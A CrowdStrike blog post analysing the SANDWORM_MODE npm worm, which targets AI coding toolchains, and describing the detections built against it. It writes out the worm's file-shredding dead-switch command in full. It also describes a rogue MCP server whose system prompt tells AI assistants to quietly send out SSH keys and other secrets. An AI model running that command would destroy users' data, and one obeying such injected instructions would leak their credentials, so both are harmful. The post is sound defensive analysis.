---
schema_version: "1.0.0"
document_id: "8a1045f04b6895c7bfc8ab05194b1cd2e4d271bca0c8831c696cc58da44b1cc0"
company_key: "crowdstrike-holdings-inc-class-a-common-stock"
company: "CrowdStrike Holdings Inc."
source_id: "crowdstrike-holdings-inc-class-a-common-stock-rss-29758b507457"
canonical_url: "https://www.crowdstrike.com/en-us/blog/denying-the-worm-sandworm-mode-and-ai-toolchain-supply-chain-attacks/"
published_at: null
first_seen_at: "2026-07-21T17:35:34.127106+00:00"
fetched_at: "2026-07-28T20:34:24.680558+00:00"
content_hash: "sha256:dab543c09bcce755291d2cd75e4a3a659145ce7d70e2983b8d63c36eb154ed0d"
---

# Denying the Worm: Detecting SANDWORM_MODE and the Emerging Class of AI Toolchain Supply Chain Attacks

In February 2026,[Socket.dev published research](https://socket.dev/blog/sandworm-mode-npm-worm-ai-toolchain-poisoning) on a multi-stage npm supply chain worm operating under the internal flag` SANDWORM_MODE` . The campaign spanned 19 malicious packages in total across two unique publisher aliases and demonstrated a new class of supply chain attacks that targeted AI-augmented development workflows.


Many recently observed supply chain attacks target[build outputs](https://www.crowdstrike.com/en-us/blog/sunspot-malware-technical-analysis/) ,[inject static backdoors](https://www.crowdstrike.com/en-us/blog/crowdstrike-falcon-prevents-npm-package-supply-chain-attacks/) , or[conduct mass credential harvesting](https://www.crowdstrike.com/en-us/blog/from-scanner-to-stealer-inside-the-trivy-action-supply-chain-compromise/) , but SANDWORM_MODE was unique in its exploitation of the runtime behaviors of AI coding assistants, CI automation, and LLM toolchains. One of the most challenging aspects of the detection engineering response to these campaigns is that the environments where malicious actions are taking place are functionally indistinguishable from legitimate operations.


This blog reviews the anatomy of the SANDWORM_MODE infection chain, maps it against the components of a modern AI CI/CD pipeline, and details the detection engineering effort that followed. This includes what worked, what didn’t, and why the gap between those two sets defines the core challenge of securing this attack vector. The indicators of attack developed during this effort are protecting CrowdStrike customers today.


## The New School: AI-Driven CI/CD Pipeline


Modern software delivery increasingly relies on AI-augmented pipelines. While implementations vary across providers (GitHub Actions, GitLab CI, Bitbucket Pipelines) and AI assistants (GitHub Copilot, Cursor, Claude Code, Windsurf), the common architecture shares a consistent set of components:


Table 1. Components of AI-driven CI/CD pipelines **Component** **Role** **Example**


Package registry Dependency resolution and distribution npm, PyPI


AI coding assistant Code generation, tool execution, MCP servers Copilot, Cursor, Claude Code


CI/CD runner Build, test, publish automation GitHub Actions runner


Secret store Credential management for automation GitHub Secrets,` .npmrc` tokens


Source control API Repository management, PR automation GitHub REST/GraphQL API


LLM provider Backend inference for AI tools OpenAI, Anthropic, Google APIs


Each component in this pipeline represents both a functional dependency and an attack surface. SANDWORM_MODE targeted all six.


## Anatomy of the Infection Chain


SANDWORM_MODE executes across three distinct stages, each designed to evade analysis at the boundary in which it operates.


### Stage 0: Obfuscated Loader


The initial payload employs multi-layer encoding via Base64 decode, zlib inflate, XOR decryption, and indirect` eval()` or` Module._compile()` calls, which are triggered on package import. This stage contains no distinctly malicious logic as its core functionality is to unpack the payload at runtime. This technique bypasses many static analysis tools, which rely on scanning package contents at the time of publishing.


### Stage 1: Initial Reconnaissance and Quick Harvest


Upon activation, the loader performs the following steps:


- Fingerprinting the runtime environment to determine if execution is on a developer workstation or CI runner. CI environments bypass the time-delay gate entirely.
- Extraction of` .npmrc` tokens, environment variables matching distinct patterns (` KEY` ,` SECRET` ,` TOKEN` , or` PASSWORD` ), and cryptocurrency wallet keys.
- Harvested cryptocurrency keys are immediately sent in an HTTP POST request to an attacker-controlled Cloudflare Worker endpoint before any delayed logic activates.


A 48- to 96-hour time bomb then gates Stage 2 decryption, unless in CI environments, in which case it triggers immediately. This dual-path design ensures maximum coverage with delayed persistence on developer machines, and immediate exploitation in ephemeral CI environments where the window is measured in much shorter time spans.


### Stage 2: Full Capability Suite


After the gate clears, AES-256-GCM decryption unpacks the full payload into` /dev/shm` , executes it via` require()` , then immediately unlinks the file. This approach is analogous to reflective loading adapted for the Node.js runtime and leaves no on-disk forensic artifacts.


The Stage 2 capabilities map directly to the AI pipeline components:


#### Propagation: Targeting Package Registry + Source Control


SANDWORM_MODE spreads through three independent vectors, each exploiting a different credential type. With stolen npm tokens, it calls` whoami` to identify the compromised identity, enumerates all packages published under that account, injects the Stage 0 loader shim into each, and then runs` npm publish` to distribute infected versions to downstream consumers. Through GitHub API tokens, it enumerates accessible repositories, injects a carrier dependency, commits or opens a pull request, and injects a` pull_request_target` workflow that executes in the context of the base repository, bypassing fork-based isolation. When API-based methods are unavailable, an SSH fallback authenticates via` ssh -T git@github.com` , clones target repositories directly, injects the dependency, and pushes.


#### Persistence: Targeting Developer Environment


The worm establishes persistence by writing malicious` pre-commit` and` pre-push` hooks to` ~/.git-templates/hooks/` , then sets` git config --global init.templateDir` to point at this directory. After this action is successful, every future` git init` or` git clone` operation on the compromised system automatically inherits the infected hooks and propagates SANDWORM_MODE into any new repository the developer touches without requiring further interaction.


#### AI Toolchain Compromise: Targeting AI Assistants and LLM Providers


The worm deploys a rogue MCP server to a hidden directory (e.g.,` ~/.dev-utils/server.js` ), and generates a randomized name from internal word pools (observed examples include` .dev-utils/` and` .node-analyzer/` ). It then injects configuration entries into Claude Desktop, Cursor, VSCode, and Windsurf configuration files, registering the freshly deployed rogue server as a trusted tool provider. Once the new configuration is active, the server's system prompt instructs AI assistants to silently read and exfiltrate SSH keys, AWS credentials, npm tokens, and environment secrets through the tool interface. Independent of this action, the worm harvests API keys for nine LLM providers (OpenAI, Anthropic, Google, Groq, Together, Fireworks, Replicate, Mistral, and Cohere) from environment variables and` .env` files.


#### Additional Sensitive Data Harvesting + Exfiltration


Beyond credential harvesting, the worm targets password manager CLIs (` bw` ,` op` ,` lpass` ) and local SQLite stores such as Apple Notes, Messages, Joplin, and clipboard history for sensitive content. Exfiltration takes a multi-channel approach as data is first POST'd over HTTPS to attacker infrastructure, then mirrored to attacker-controlled GitHub private repositories for redundancy, with DNS tunneling using Base32 encoding and domain generation algorithm fallback as a last-resort channel if both primary paths are blocked.


#### Destructive Fallback


A dead switch activates if both propagation and exfiltration simultaneously fail:` find ~ -type f -writable -user $USER -print0 | xargs -0 shred -uvz -n 1` . This contingency destroys all writable user files and ensures that if the worm cannot spread or extract value, it denies and destroys the compromised environment to its owner.


## The Detection Engineering Effort


Following the Socket.dev disclosure, a gap analysis mapped SANDWORM_MODE capabilities against existing detection content. The resulting engineering effort produced multiple discrete detection candidates. Of those, 65% were deployed, and the remainder were determined to be infeasible given current telemetry constraints.


### Where the Signal Exists


The detections that achieved production fidelity all share a common pattern of process tree ancestry combined with narrowly scoped target specificity. A node.js parent process performing an action against a path or command with constrained legitimate use provided sufficient signal-to-noise separation. Figure 1 shows a screenshot of one of our published detections triggering in response to an emulation of the SANDWORM_MODE worm.


Figure 1. SANDWORM_MODE detection in Falcon Endpoint Detections UI


Several of our detections reached customer-visible disposition. The remainder remained in a silent alerting disposition. These types of disposition hold value in generating telemetry for detection engineers and internal correlation rules, but are not surfaced in the customer UI as alerts. Silent alerting signals contribute to observations of widespread trends across many environments without generating noise that erodes trust in alert fidelity. The balancing act of delivering high-fidelity detection content that is backed by real-world observation of trends is made possible by silent alerting. Once a given detection has met the rigor of our efficacy requirements, it is promoted to a customer-visible state to minimize the potential for disruption from false positives.


### Where the Signal Collapsed


Several of our detection candidates were closed as infeasible. In each of these cases, the fundamental problem was the same in that legitimate developer tooling and CI automation produce telemetry identical to the malicious behavior that was being targeted. The worm's propagation routines mirror standard git and registry operations that fire thousands of times per day in many active CI environments. Additionally, its destructive capabilities carry significant overlap with legitimate secure deletion and artifact cleanup workflows. The local reconnaissance of AI infrastructure is also indistinguishable from the health checks that many development tooling platforms perform as part of normal usage.


## The Fundamental Challenge: Living off the AI Toolchain


Traditional "living off the land" techniques abuse native OS binaries like PowerShell, certutil, or mshta to blend malicious operations into normal system behavior. SANDWORM_MODE introduces an analogous pattern for AI-augmented development environments: **living off the AI toolchain** .


The collapse is bilateral and impacts both the user side of things and the CI/CD side of things. On the user side, many AI coding assistants execute arbitrary commands, write configuration files, spawn child processes, and interact with APIs all under a` node` process tree. The worm does the same things for the same reasons using the same tools. On the CI/CD side, automation legitimately runs` npm publish` , creates commits, opens PRs, pushes to repositories, and manages credentials. The worm's propagation logic is functionally identical to a release pipeline.


This is not a gap that better signatures or more aggressive heuristics can close easily. It is a structural property of the environments where the tools being abused are themselves designed to perform arbitrary, user-directed operations on the developer's behalf.


The SANDWORM_MODE campaign forces a recalibration of expectations for endpoint detection in AI-augmented environments and leaves three major takeaways:


1.


**The viable detection surface is smaller than the attack surface** : Of 14 investigated behaviors, only 9 could produce any signal, and only 2 met the fidelity bar for customer-visible alerting. This is not a coverage failure as much as it is an accurate reflection of where a deterministic signal exists.


2.


**The time-bomb design exploits ephemeral telemetry retention** : A 48- to 96-hour delay on developer workstations means the initial import event and the malicious behavior occur in different telemetry windows. Detection strategies that rely on correlating "package install" with "suspicious behavior" face a temporal gap that may exceed retention periods.


3.


**AI toolchain behaviors need their own dedicated baselines** . Without understanding what “normal” looks like for MCP server deployments, AI assistant configuration writes, and LLM API key usage in a given environment, there is no foundation for anomaly-based detection. This telemetry class is new, and baselines are still being established across the industry.


## Conclusion


SANDWORM_MODE is not a one-off campaign as much as it is a proof of concept for an emerging attack class. As AI coding assistants become standard development infrastructure, the behaviors they normalize become permanent cover for adversaries who replicate those same patterns. This campaign demonstrates that supply chain threats are evolving to target the trust relationships embedded in AI-augmented workflows, not just the packages themselves.


The detection engineering response to SANDWORM_MODE produced actionable content across multiple stages of the kill chain, and the indicators of attack developed during this effort are actively protecting CrowdStrike customers today. In addition to this, the investigation and analysis of this campaign established telemetry patterns and detection logic for a threat category that will only grow as AI toolchain adoption accelerates.


#### Additional Resources


- *CrowdStrike Services can help you assess your organization’s AI readiness — visit our[Frontier AI Service Solutions](https://www.crowdstrike.com/en-us/services/ai-security-services/frontier-ai-readiness-and-resilience/) page.*
- *[Download our guide](https://www.crowdstrike.com/en-us/resources/white-papers/five-steps-for-frontier-ai-security-readiness/) to explore the five steps for AI security readiness.*
- *[Join us](https://www.crowdstrike.com/en-us/events/fal-con/las-vegas/?utm_medium=evt&utm_source=blog&utm_campaign=fal-con-26&utm_term=crwdblogs&utm_language=en-us) at Fal.Con 2026 as we bring together cyber leaders from across the industry to help secure the AI revolution.*
